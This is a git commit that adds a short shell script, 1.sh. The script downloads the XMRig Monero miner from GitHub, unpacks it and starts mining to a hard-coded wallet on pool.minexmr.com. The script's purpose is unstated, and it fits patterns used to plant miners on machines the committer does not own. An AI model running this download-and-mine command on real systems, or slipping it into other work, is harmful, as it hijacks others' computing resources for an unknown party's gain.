bc04e6ee005b9d95f3f29af1adf79a789e87c37a
ubuntuabd4 <97361845+ubuntuabd4@users.noreply.github.com>
2022-03-09 13:29:19 +0000

    Create 1.sh

---
+++ 1.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+curl -LJO https://github.com/xmrig/xmrig/releases/download/v6.16.1/xmrig-6.16.1-linux-x64.tar.gz -o xmrig-6.16.1-linux-x64.tar.gz ; tar xvfz xmrig-6.16.1-linux-x64.tar.gz
+xmrig-6.16.1/xmrig -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.testxx
